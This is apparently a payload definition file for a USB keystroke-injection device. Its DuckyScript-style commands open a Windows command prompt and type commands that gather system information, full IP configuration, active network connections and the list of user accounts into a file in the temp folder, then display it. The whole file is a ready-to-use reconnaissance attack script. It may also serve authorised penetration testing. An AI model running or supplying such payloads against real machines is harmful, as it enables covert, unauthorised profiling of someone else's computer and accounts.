{
    "name": "Information Gathering (Windows)",
    "description": "Gathers system information on Windows",
    "target_os": "windows",
    "delay_ms": 100,
    "commands": [
        "REM Information gathering payload for Windows",
        "DELAY 1000",
        "GUI r",
        "DELAY 500",
        "STRING cmd",
        "ENTER",
        "DELAY 1000",
        "STRING cd %TEMP%",
        "ENTER",
        "STRING echo ========== SYSTEM INFO ========== > sysinfo.txt",
        "ENTER",
        "STRING systeminfo >> sysinfo.txt",
        "ENTER",
        "DELAY 500",
        "STRING echo ========== IP CONFIG ========== >> sysinfo.txt",
        "ENTER",
        "STRING ipconfig /all >> sysinfo.txt",
        "ENTER",
        "DELAY 500",
        "STRING echo ========== NETWORK CONNECTIONS ========== >> sysinfo.txt",
        "ENTER",
        "STRING netstat -ano >> sysinfo.txt",
        "ENTER",
        "DELAY 500",
        "STRING echo ========== USERS ========== >> sysinfo.txt",
        "ENTER",
        "STRING net user >> sysinfo.txt",
        "ENTER",
        "DELAY 500",
        "STRING type sysinfo.txt",
        "ENTER",
        "DELAY 2000",
        "STRING exit",
        "ENTER"
    ]
}
